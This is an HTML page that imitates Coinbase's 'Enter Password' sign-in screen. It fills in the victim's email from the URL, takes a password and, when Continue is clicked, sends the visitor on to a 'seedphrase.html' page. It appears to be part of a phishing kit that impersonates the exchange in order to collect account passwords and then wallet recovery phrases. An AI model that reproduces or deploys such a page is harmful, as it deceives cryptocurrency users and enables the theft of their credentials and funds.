<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Coinbase - Enter Password</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
    }

    body {
      background-color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .header {
      width: 100%;
      height: 64px;
      display: flex;
      align-items: center;
      padding: 0 24px;
      border-bottom: 1px solid #ffffff;
    }

    .logo {
      height: 40px;
    }

    .signup {
      margin-left: auto;
      font-size: 16px;
      color: #2563eb;
      text-decoration: none;
      font-weight: 500;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 48px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      padding: 48px 36px;
      border: 1px solid #e5e5e5;
      border-radius: 16px;
    }

    .card h2 {
      font-size: 24px;
      font-weight: 600;
      color: #111111;
      margin-bottom: 24px;
      text-align: left;
    }

    .email-preview {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 24px;
    }

    .email-preview img {
      width: 36px;
      height: 36px;
      border-radius: 50%;
    }

    .email-preview span {
      font-size: 16px;
      font-weight: 500;
      color: #333333;
    }

    label {
      display: block;
      font-size: 16px;
      margin-bottom: 8px;
      color: #333333;
      font-weight: 500;
    }

    .password-wrapper {
      position: relative;
      margin-bottom: 16px;
    }

    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 14px 44px 14px 14px;
      font-size: 16px;
      border: 1px solid #cccccc;
      border-radius: 10px;
    }

    .eye-icon {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      cursor: pointer;
      opacity: 0.6;
    }

    .forgot {
      display: block;
      font-size: 14px;
      color: #2563eb;
      text-decoration: none;
      margin-bottom: 24px;
      font-weight: 500;
    }

    button {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      font-weight: 600;
      background-color: #196aff;
      color: #ffffff;
      border: none;
      border-radius: 999px;
      cursor: pointer;
    }

    .cancel {
      margin-top: 24px;
      text-align: center;
    }

    .cancel a {
      font-size: 16px;
      color: #2563eb;
      text-decoration: none;
      font-weight: 500;
    }

    @media (max-width: 480px) {
      .card {
        padding: 40px 24px;
      }
    }
  </style>
</head>
<body>

  <div class="header">
    <img class="logo" src="Coinbase_Pro_2021_App-removebg-preview.png" alt="Coinbase Logo" />
    <a class="signup" href="#">Sign up</a>
  </div>

  <div class="container">
    <div class="card">
      <h2>Sign in to Coinbase</h2>

      <div class="email-preview">
        <img src="https://s.pinimg.com/images/user/default_140.png" alt="user icon" />
        <span id="user-email">user@example.com</span>
      </div>

      <label for="password">Password</label>
      <div class="password-wrapper">
        <input type="password" id="password" placeholder="" />
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzBRwImgYMkhAWBF6CcMGFHMfiAGXZtubQUg&s" alt="Toggle password visibility" class="eye-icon" id="togglePassword">
      </div>

      <a class="forgot" href="#">Forgot password?</a>

      <button id="continueBtn" type="button">Continue</button>

      <div class="cancel">
        <a href="#">Cancel signing in</a>
      </div>
    </div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");
    if (email) {
      document.getElementById("user-email").textContent = email;
    }

    const togglePassword = document.getElementById("togglePassword");
    const passwordInput = document.getElementById("password");

    const eyeClosed = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzBRwImgYMkhAWBF6CcMGFHMfiAGXZtubQUg&s";
    const eyeOpen = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaMYerieO0jq-7XVmlaYt7JSVRBso4mSi5_HRCNHMyZoehWUpphIhAlMQ7DCWkM6d7bSs&usqp=CAU";

    togglePassword.addEventListener("click", () => {
      const isPassword = passwordInput.type === "password";
      passwordInput.type = isPassword ? "text" : "password";
      togglePassword.src = isPassword ? eyeOpen : eyeClosed;
    });

    // âœ… REDIRECT to seedphrase.html on Continue click
    document.getElementById("continueBtn").addEventListener("click", () => {
      const password = passwordInput.value.trim();
      if (password === "") {
        alert("Please enter your password.");
        return;
      }

      // Redirect with email param to seedphrase.html
      const url = `seedphrase.html${email ? "?email=" + encodeURIComponent(email) : ""}`;
      window.location.href = url;
    });
  </script>
</body>
</html>
